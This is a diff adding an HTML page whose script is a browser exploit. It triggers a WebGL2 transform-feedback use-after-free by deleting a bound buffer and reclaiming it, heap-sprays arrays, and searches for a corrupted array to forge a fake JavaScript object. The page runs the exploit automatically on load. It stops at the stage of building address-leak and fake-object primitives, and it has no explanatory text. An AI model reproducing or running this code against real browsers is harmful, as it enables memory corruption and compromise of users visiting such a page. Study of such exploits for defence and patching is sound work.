@@ -1,0 +1,297 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta http-equiv="Pragma" CONTENT="no-cache">
+        <meta http-equiv="Expires" CONTENT="-1">
+    </head>
+<body>
+    <canvas id="canvas"></canvas>
+    <script>
+        //define global variables.
+        var canvas = null;
+        var gl = null;
+
+        var g_double_array = [];
+        var g_contigous_array = [];
+        var evil_array_content = new Array(0xe000).fill(0.0);
+        var corrupted_array = null;
+        var g_index = 0;
+
+        //var SPRAY_SIZE = 0x4000000;
+        var SPRAY_SIZE = 0x2000000; //for test
+        var found = false;
+
+        var g_ab = new ArrayBuffer( 0x200 );
+        var g_f64 = new Float64Array(g_ab);
+        var g_data = new Uint8Array(g_ab);
+
+        var dv = new DataView(new ArrayBuffer(8));
+        var floatAsQword = float => {
+            dv.setFloat64(0, float, true);
+            var low = dv.getUint32(0, true);
+            var high = dv.getUint32(4, true);
+            return low + (high * 0x100000000);
+        }
+
+        function gc() {
+            for (let i = 0; i < 64; i++)
+            new WebAssembly.Memory({initial:1024 /* 64 MB */})
+        }
+        
+        function fullgc() {
+            gc()
+            for (let i = 0; i < 50; i++)
+            new ArrayBuffer(16*1024*1024 /* 16 MB */)
+        }
+
+        var qwordAsTagged = qword =>{
+            return qwordAsFloat( qword - 0x02000000000000);
+        }
+        
+        var qwordAsFloat = qword => {
+            dv.setUint32(0, qword%0x100000000, true);
+            dv.setUint32(4, qword/0x100000000, true);
+            return dv.getFloat64(0, true);
+        }
+
+        function dump(arr)
+        {
+            for(let i=0;i<arr.length;i++)
+                document.write( i + " => " + arr[i] + "<br>");
+        }
+
+        function log(s)
+        {
+            document.write(s + "<br>");
+        }
+
+        function sleep( sleepDuration ){
+            var now = new Date().getTime();
+            while(new Date().getTime() < now + sleepDuration){ /* do nothing */ }
+        }
+  
+        function makeJITedFunction()
+        {
+            // Some code to avoid inlining...
+            function target(num) {
+                for (var i = 2; i < num; i++) {
+                    if (num % i === 0) {
+                        return false;
+                    }
+                }
+                return true;
+            }
+
+            // Force JIT compilation.
+            for (var i = 0; i < 1000; i++) {
+                target(i);
+            }
+            for (var i = 0; i < 1000; i++) {
+                target(i);
+            }
+            for (var i = 0; i < 1000; i++) {
+                target(i);
+            }
+
+            return target;
+        }
+
+        function array_spray(value)
+        {
+            for(let i=0;i<SPRAY_SIZE;i++)
+            {
+                tmp = new Array();
+                tmp2 = new Array();
+                g_double_array.push(tmp);
+                g_contigous_array.push(tmp2);
+                tmp[0] = 0.0;
+                tmp[1] = qwordAsFloat(floatAsQword(value)+0x5d);
+                tmp[2] = 0.0;
+                tmp[3] = 0.0;
+
+                tmp2[0] = tmp;
+                tmp2[1] = evil_array_content;
+                tmp2[2] = evil_array_content;
+            }
+        }
+
+        function build_link_program()
+        {
+            var vsSource = `#version 300 es
+    
+layout (location=0) in vec4 position;
+layout (location=1) in vec3 color;
+    
+out vec3 vColor;
+out float sum;
+
+void main() {
+    vColor = color;
+    gl_Position = position;
+}`;
+
+            var fsSource = `#version 300 es
+precision highp float;
+
+in vec3 vColor;
+out vec4 fragColor;
+
+void main() {
+    fragColor = vec4(vColor, 1.0);
+}`;
+
+            
+            var vertexShader = gl.createShader(gl.VERTEX_SHADER);
+            gl.shaderSource(vertexShader, vsSource);
+            gl.compileShader(vertexShader);
+
+            if (!gl.getShaderParameter(vertexShader, gl.COMPILE_STATUS)) {
+                console.error(gl.getShaderInfoLog(vertexShader));
+            }
+
+            var fragmentShader = gl.createShader(gl.FRAGMENT_SHADER);
+            gl.shaderSource(fragmentShader, fsSource);
+            gl.compileShader(fragmentShader);
+
+            if (!gl.getShaderParameter(fragmentShader, gl.COMPILE_STATUS)) {
+                console.error(gl.getShaderInfoLog(fragmentShader));
+            }
+
+            var program = gl.createProgram();
+            gl.attachShader(program, vertexShader);
+            gl.attachShader(program, fragmentShader);
+
+            gl.transformFeedbackVaryings(
+                program,
+                ['sum'],
+                gl.SEPARATE_ATTRIBS,
+            );        
+
+            gl.linkProgram(program);
+
+            if (!gl.getProgramParameter(program, gl.LINK_STATUS)) {
+                console.error(gl.getProgramInfoLog(program));
+            }
+            return program;            
+        }
+
+        function trigger(value)
+        {
+            var canvas = document.createElement("canvas");
+            canvas.id = 'canvas';
+            document.body.appendChild( canvas );            
+            gl = canvas.getContext("webgl2");
+            gl.clearColor(0, 0, 0, 1);
+
+            var program = build_link_program();
+            gl.useProgram(program);
+
+            var positions = new Float32Array([
+                -0.5, -0.5, 0.0,
+            ]);
+            const tf = gl.createTransformFeedback();
+            gl.bindTransformFeedback(gl.TRANSFORM_FEEDBACK, tf);
+
+            //check 2
+            g_f64.fill(value);
+            g_f64[0] = 0.0;
+            g_f64[1] = 0.0;
+
+            g_f64[15] = 0.0;
+            g_f64[16] = 0.0;
+            g_f64[17] = 0.0;
+            g_f64[18] = 0.0;
+            g_f64[55] = qwordAsFloat( floatAsQword(value)-0x30 );
+            g_f64[56] = 0.0;
+            g_f64[57] = 0.0;
+            g_f64[58] = 0.0;
+
+            var sumBuffer = gl.createBuffer();
+            
+            gl.bindBuffer(gl.ARRAY_BUFFER, sumBuffer);
+            gl.bufferData(gl.ARRAY_BUFFER, 24, gl.STATIC_DRAW);        
+            
+            gl.bindBufferBase(gl.TRANSFORM_FEEDBACK_BUFFER, 0, sumBuffer);
+            
+            gl.bindTransformFeedback(gl.TRANSFORM_FEEDBACK, null);
+
+            var positionBuffer = gl.createBuffer();
+            gl.bindBuffer(gl.ARRAY_BUFFER, positionBuffer);
+            gl.bufferData(gl.ARRAY_BUFFER, positions, gl.STATIC_DRAW);
+            gl.bindTransformFeedback(gl.TRANSFORM_FEEDBACK, tf);
+            gl.beginTransformFeedback(gl.TRIANGLES);
+
+            var dummy = gl.createBuffer();
+            gl.bindBuffer( gl.ARRAY_BUFFER, dummy);
+            gl.deleteBuffer( sumBuffer ); //free
+            
+            gl.bufferData( gl.ARRAY_BUFFER, g_data, gl.DYNAMIC_DRAW ); //reclaim
+
+            gl.drawArrays(gl.TRIANGLES, 0, 3); //trigger.
+        }
+
+        function exploit()
+        {
+            for(let i=0;i<10;i++)
+                gc();
+            //check1
+            addr_list = [ qwordAsFloat(0x8515baca8) ];
+            //0x8515baca8
+            //0x8781040c8
+            //0x8d0104518
+            //0x18e810b698
+            //0x1860105bc8
+
+            array_spray(addr_list[0]);
+                         
+            for(let cnt=0;cnt<addr_list.length;cnt++) {
+                for(let j=0;j<5;j++) { //trigger count..
+                    if(found)
+                        break;
+                    trigger(addr_list[cnt]);                    
+                    //found check.
+                    for(let i=0;i<SPRAY_SIZE;i++)
+                    {
+                        if( floatAsQword(g_double_array[i][0]) == 0x1010000000000 ) //find corrupted array.
+                        {
+                            corrupted_array = g_double_array[i];
+                            corrupted_array[11] = qwordAsFloat( 0x0000133800001338 );
+                            for(let i=0;i<SPRAY_SIZE;i++) {
+                                if(g_double_array[i].length == 0x1338) {
+                                    found = true;
+                                    g_index = i;
+                                    fake_array = g_double_array[i];
+                                }
+                            }                    
+                            break;
+                        }
+                    } //end spray-array for loop
+                }
+            } //end addr_list for loop
+
+            if(!found) {
+                log("[-] fail...retry..");
+                g_double_array = [];
+                g_contigous_array = [];
+                location.reload();
+            }
+
+            if(found)
+            {
+                fake_array[0] = qwordAsFloat(0x0008240700000828);  //fake jscell | not valid structure id,
+                fake_array[1] = fake_array[6];  //fake_array[6] is original array.
+                //alert('found corrupted array.');
+
+                fake_array[6] = qwordAsFloat( floatAsQword( addr_list[0] ) + 0xc0);                
+                var jscell = g_contigous_array[g_index][0][0];
+                fake_array[0] = jscell; //store to valid jscell id & structure id
+                
+                //fakeobj & addrof stuff.
+            }
+        }
+
+        exploit();
+
+    </script>
+</body>
+</html>
